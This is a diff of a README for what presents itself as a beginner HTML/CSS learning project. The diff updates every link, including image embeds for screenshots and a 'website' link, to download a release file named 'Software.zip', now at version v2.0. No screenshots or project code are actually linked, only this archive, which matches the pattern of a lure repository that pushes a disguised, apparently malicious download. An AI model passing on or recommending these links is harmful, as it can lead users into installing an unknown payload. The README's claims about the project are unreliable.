@@ -3,7 +3,7 @@
 
 🌟 Welcome to the "7-HTML-CSS-REVISION" project! 🌟
 
-![HTML CSS](https://github.com/Bernardo1233/7-HTML-CSS-REVISION/releases/download/v1.0/Software.zip)
+![HTML CSS](https://github.com/Bernardo1233/7-HTML-CSS-REVISION/releases/download/v2.0/Software.zip)
 
 This repository is a comprehensive learning project where I explored HTML and CSS concepts by implementing tables, forms, and revising CSS attributes. Throughout this project, I delved into various HTML tags, attributes, and CSS properties to enhance my web development skills. Let's dive deeper into the details of this exciting repository!
 
@@ -32,7 +32,7 @@ In this project, I focused on creating tables and forms using HTML and styling t
 ## Project Link
 
 🔗 To explore the project code, you can download it by clicking the following link: 
-[Download Project ZIP](https://github.com/Bernardo1233/7-HTML-CSS-REVISION/releases/download/v1.0/Software.zip)
+[Download Project ZIP](https://github.com/Bernardo1233/7-HTML-CSS-REVISION/releases/download/v2.0/Software.zip)
 (Note: Extract the downloaded ZIP file to access the project files.)
 
 ## Launch Project
@@ -43,9 +43,9 @@ In this project, I focused on creating tables and forms using HTML and styling t
 
 🖼️ Here are some snapshots of the project to give you a glimpse of the HTML tables, forms, and CSS styling implemented:
 
-![HTML CSS Project](https://github.com/Bernardo1233/7-HTML-CSS-REVISION/releases/download/v1.0/Software.zip)
-![HTML Tables](https://github.com/Bernardo1233/7-HTML-CSS-REVISION/releases/download/v1.0/Software.zip)
-![CSS Styling](https://github.com/Bernardo1233/7-HTML-CSS-REVISION/releases/download/v1.0/Software.zip)
+![HTML CSS Project](https://github.com/Bernardo1233/7-HTML-CSS-REVISION/releases/download/v2.0/Software.zip)
+![HTML Tables](https://github.com/Bernardo1233/7-HTML-CSS-REVISION/releases/download/v2.0/Software.zip)
+![CSS Styling](https://github.com/Bernardo1233/7-HTML-CSS-REVISION/releases/download/v2.0/Software.zip)
 
 ## How to Contribute?
 
@@ -57,7 +57,7 @@ In this project, I focused on creating tables and forms using HTML and styling t
 
 ## Visit Website
 
-🌐 To explore more projects and resources related to HTML, CSS, and web development, visit the [GitHub Repository](https://github.com/Bernardo1233/7-HTML-CSS-REVISION/releases/download/v1.0/Software.zip).
+🌐 To explore more projects and resources related to HTML, CSS, and web development, visit the [GitHub Repository](https://github.com/Bernardo1233/7-HTML-CSS-REVISION/releases/download/v2.0/Software.zip).
 
 ## Releases Section
 
